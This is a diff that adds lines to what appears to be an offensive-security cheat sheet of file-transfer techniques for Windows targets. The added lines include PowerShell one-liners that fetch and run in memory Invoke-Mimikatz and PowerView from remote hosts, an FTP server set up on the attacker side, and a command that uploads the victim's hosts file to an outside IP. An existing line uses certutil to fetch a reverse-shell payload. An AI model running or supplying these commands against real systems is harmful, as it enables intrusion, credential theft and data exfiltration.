@@ -210,7 +210,24 @@ Download and execute file using powershell:
 Download files:
 
 	certutil.exe -urlcache -f http://<localhostip>/rev_shell <path_to_where_file_is_gonna_be_saved>
+
 	(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+	IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+
+	Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+	Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+
+Download files using ftp:
+
+	sudo pip3 install pyftpdlib
+	sudo python3 -m pyftpdlib --port 21
+
+	(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
+
+Upload using ftp:
+
+	(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 
 Good dir to save, download and write files:
 
